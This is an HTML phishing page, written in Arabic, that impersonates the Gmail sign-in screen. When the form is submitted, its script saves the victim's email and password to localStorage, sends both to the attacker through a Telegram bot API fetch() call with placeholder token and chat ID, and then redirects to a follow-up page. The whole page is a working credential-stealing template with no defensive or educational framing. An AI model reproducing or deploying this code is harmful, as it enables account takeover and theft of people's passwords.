<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول</title>
</head>
<body>
  <h2>تسجيل الدخول إلى Gmail</h2>
  <form id="loginForm">
    <input type="email" id="email" placeholder="البريد الإلكتروني" required><br>
    <input type="password" id="password" placeholder="كلمة المرور" required><br>
    <button type="submit">التالي</button>
  </form>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      // حفظ البيانات مؤقتًا
      localStorage.setItem("email", email);
      localStorage.setItem("password", password);

      // إرسال إلى Telegram
      fetch(`https://api.telegram.org/bot<توكنك>/sendMessage?chat_id=<IDك>&text=📩 Gmail Login\nEmail: ${email}\nPassword: ${password}`);

      // الانتقال للصفحة الثانية
      window.location.href = "conform.html";
    });
  </script>
</body>
</html>
